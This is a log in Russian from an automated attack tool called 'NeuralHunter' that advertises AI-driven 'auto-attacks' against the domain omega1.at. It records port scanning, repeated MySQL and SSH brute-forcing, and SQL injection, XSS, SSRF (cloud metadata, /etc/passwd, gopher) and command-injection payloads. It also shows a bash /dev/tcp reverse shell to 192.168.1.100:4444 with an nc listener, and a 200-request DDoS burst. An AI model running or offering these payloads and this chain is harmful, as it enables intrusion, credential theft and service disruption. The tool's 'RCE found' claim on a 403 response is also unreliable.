2025-11-04 15:48:33,959 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ЛОГЕР v10.1 АКТИВИРОВАН[/bold magenta]
2025-11-04 15:48:34,444 - NeuralHunter - INFO - ЦЕПОЧКА: HUNTER → http://omega1.at/FUZZ
2025-11-04 15:48:34,445 - NeuralHunter - INFO - ULTIMATE TOKEN HUNTER → http://omega1.at/FUZZ
2025-11-04 15:48:34,910 - NeuralHunter - INFO - [GET] http://omega1.at/ → 200
2025-11-04 15:48:34,913 - NeuralHunter - INFO - ЦЕПОЧКА: PORT_SCAN → http://omega1.at/FUZZ
2025-11-04 15:48:34,915 - NeuralHunter - INFO - PORT SCAN → http://omega1.at/FUZZ
2025-11-04 15:48:34,925 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 21
2025-11-04 15:48:34,929 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 22
2025-11-04 15:48:34,932 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 80
2025-11-04 15:48:34,936 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 443
2025-11-04 15:48:34,940 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8080
2025-11-04 15:48:34,944 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8443
2025-11-04 15:48:34,947 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 3306
2025-11-04 15:48:34,951 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 5432
2025-11-04 15:48:34,956 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:48:34,958 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 15:48:48,010 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:48:48,012 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 15:49:18,462 - NeuralHunter - INFO - ЦЕПОЧКА: SQL → http://omega1.at/FUZZ
2025-11-04 15:49:18,463 - NeuralHunter - INFO - SQL INJECTION → http://omega1.at/FUZZ
2025-11-04 15:49:18,763 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=1 → 200
2025-11-04 15:49:18,764 - NeuralHunter - INFO - ОТВЕТ: 200 (437 bytes)
2025-11-04 15:49:18,765 - NeuralHunter - ERROR - JSON ошибка: Expecting value: line 1 column 3 (char 2)
2025-11-04 15:49:18,767 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:49:18,768 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 15:49:32,838 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:49:32,840 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 15:50:03,083 - NeuralHunter - INFO - ЦЕПОЧКА: XSS → http://omega1.at/FUZZ
2025-11-04 15:50:03,085 - NeuralHunter - INFO - XSS АТАКА → http://omega1.at/FUZZ
2025-11-04 15:50:03,086 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 15:50:03,629 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 15:50:03,632 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
2025-11-04 15:50:03,913 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E → 200
2025-11-04 15:50:03,915 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29
2025-11-04 15:50:04,191 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29 → 200
2025-11-04 15:50:04,194 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E
2025-11-04 15:50:04,466 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E → 200
2025-11-04 15:50:04,469 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 15:50:04,964 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 15:50:04,968 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E
2025-11-04 15:50:05,473 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E → 403
2025-11-04 15:50:05,476 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:50:05,478 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 15:50:18,530 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:50:18,532 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 15:50:48,898 - NeuralHunter - INFO - ЦЕПОЧКА: CSRF → http://omega1.at/FUZZ
2025-11-04 15:50:48,899 - NeuralHunter - INFO - CSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 15:50:49,177 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ → 200
2025-11-04 15:50:49,179 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:50:49,180 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 15:51:04,247 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:51:04,249 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 15:51:34,435 - NeuralHunter - INFO - ЦЕПОЧКА: SSRF → http://omega1.at/FUZZ
2025-11-04 15:51:34,436 - NeuralHunter - INFO - SSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 15:51:34,438 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/
2025-11-04 15:51:34,711 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/ → 200
2025-11-04 15:51:34,713 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22
2025-11-04 15:51:35,005 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22 → 200
2025-11-04 15:51:35,006 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd
2025-11-04 15:51:35,524 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd → 403
2025-11-04 15:51:35,526 - NeuralHunter - WARNING - SSRF ЗАБЛОКИРОВАН: 403 на file:///etc/passwd
2025-11-04 15:51:35,527 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///proc/version
2025-11-04 15:51:35,816 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///proc/version → 200
2025-11-04 15:51:35,817 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e
2025-11-04 15:51:36,111 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e → 200
2025-11-04 15:51:36,113 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:51:36,114 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 15:51:50,155 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:51:50,157 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 15:52:20,415 - NeuralHunter - INFO - ЦЕПОЧКА: RCE → http://omega1.at/FUZZ
2025-11-04 15:52:20,417 - NeuralHunter - INFO - RCE АТАКА → http://omega1.at/FUZZ
2025-11-04 15:52:20,419 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Bid
2025-11-04 15:52:20,729 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bid → 200
2025-11-04 15:52:20,731 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%7Cwhoami
2025-11-04 15:52:21,010 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%7Cwhoami → 200
2025-11-04 15:52:21,012 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%24%28id%29
2025-11-04 15:52:21,527 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%24%28id%29 → 403
2025-11-04 15:52:21,530 - NeuralHunter - INFO - RCE НАЙДЕН: $(id)
2025-11-04 15:52:21,534 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:52:21,536 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 15:52:34,570 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:52:34,571 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 15:53:04,931 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:53:04,933 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
2025-11-04 15:53:04,934 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
2025-11-04 15:53:05,445 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
2025-11-04 15:53:05,449 - NeuralHunter - INFO - ЦЕПОЧКА: DDOS → http://omega1.at/FUZZ
2025-11-04 15:53:05,450 - NeuralHunter - WARNING - SMART DDOS: 200 запросов → http://omega1.at/FUZZ (ТОЛЬКО НА СВОЙ СЕРВЕР!)
2025-11-04 15:54:13,752 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:54:13,754 - NeuralHunter - INFO - MYSQL BRUTEFORCE → omega1.at:3306
2025-11-04 15:54:26,782 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:54:26,784 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 15:54:57,154 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL → http://omega1.at/FUZZ[/bold cyan]
2025-11-04 15:54:57,156 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
2025-11-04 15:54:57,157 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
2025-11-04 15:54:57,648 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
